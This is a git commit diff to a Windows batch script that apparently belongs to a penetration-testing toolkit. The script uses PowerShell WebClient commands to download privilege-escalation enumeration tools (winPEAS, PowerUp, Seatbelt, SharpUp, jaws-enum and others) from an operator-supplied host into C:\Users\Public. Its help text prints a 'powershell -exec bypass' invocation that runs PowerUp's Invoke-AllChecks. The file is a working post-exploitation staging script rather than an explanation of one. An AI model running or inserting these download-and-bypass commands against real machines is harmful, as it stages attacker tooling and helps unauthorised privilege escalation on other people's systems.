d8667100b2b7a8e4e68dd26e7f51d5abeb32aca5
Otosan1554 <52628890+Otosan1554@users.noreply.github.com>
2022-01-21 10:07:32 -0500

    Update script_windows.bat

--- windows-script/script_windows.bat
+++ windows-script/script_windows.bat
@@ -1,12 +1,15 @@
-@echo off
-
-echo %%1 = %1
 rmdir C:\Users\Public\script
 mkdir C:\Users\Public\script
 if "%1"== "" goto ERROR
 if "%1"== "help" goto HELPTXT
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk.exe','C:\Users\Public\script\accesschk.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk64.exe','C:\Users\Public\script\accesschk64.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk64.exe','C:\Users\Public\script\accesschk64.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/jaws-enum.ps1','C:\Users\Public\script\jaws-enum.ps1')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/Powerless.bat','C:\Users\Public\script\Powerless.bat')"
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/PowerUp.ps1','C:\Users\Public\script\PowerUp.ps1')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/Seatbelt.exe','C:\Users\Public\script\Seatbelt.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/SharpUp.exe','C:\Users\Public\script\SharpUp.exe')"
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/windows-privesc-check2.exe','C:\Users\Public\script\windows-privesc-check2.exe')"
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASany.exe','C:\Users\Public\script\winPEASany.exe')"
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASx64.exe','C:\Users\Public\script\winPEASx64.exe')"
@@ -22,6 +25,6 @@ exit /B
 echo "powershell -ep bypass"
 echo ". .\PowerUp.ps1"
 echo "Invoke-AllChecks"
+echo powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
 
 exit /B
-
